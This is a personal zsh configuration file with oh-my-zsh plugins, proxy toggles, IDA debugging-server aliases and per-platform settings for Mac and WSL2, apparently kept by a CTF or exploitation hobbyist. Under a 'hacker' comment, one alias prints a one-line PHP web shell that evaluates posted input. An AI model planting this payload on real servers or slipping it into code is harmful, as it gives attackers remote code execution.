export ZSH="$HOME/.oh-my-zsh"
UNAME=$(uname -a)
alias proxyoff="export https_proxy='' http_proxy='' all_proxy=''"
alias proxyon="export https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890 all_proxy=socks5://127.0.0.1:7890"
alias google="curl google.com"
alias baidu="curl baidu.com"
alias idax86="cd ~/ida && ./linux_server"
alias idax64="cd ~/ida && ./linux_server64"
alias pwn="code ~/pwn"
alias update="cd ~/maintain && git pull"
alias ggg="gaa && gcmsg ".." && gp"
# for ubuntu Desktop
# for m1 MACbook
if [[ $UNAME =~ "Mac" ]]
then
    echo "U are using Mac! I know."
    alias pd="prlctl start"
    alias python3="/opt/homebrew/bin/python3"
    alias pip3="/opt/homebrew/bin/pip3"
fi
# for WSL2
if [[ $UNAME =~ "WSL2" ]]
then
    echo "U are using WSL2! I know."
    export User="27564"
    export Desktop="/mnt/c/Users/$User/Desktop"
    export Downloads="/mnt/c/Users/$User/Downloads"
    alias pwncp="cp /mnt/c/Users/27564/Desktop/pwnfiles/* ~/pwn/target && chmod a+x ~/pwn/target/*"
fi
# hacker
alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.0.0'
alias trojan="echo '<?php @eval(\$_POST['attack']);?>'"

ZSH_THEME="ys"

plugins=(git
gitignore
extract
sudo
zsh-autosuggestions
zsh-syntax-highlighting
autojump
)
	
ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE="fg=#ff00ff,bg=cyan,bold,underline"

[[ -s $HOME/.autojump/etc/profile.d/autojump.sh ]] && source $HOME/.autojump/etc/profile.d/autojump.sh
autoload -U compinit && compinit -u
source $ZSH/oh-my-zsh.sh
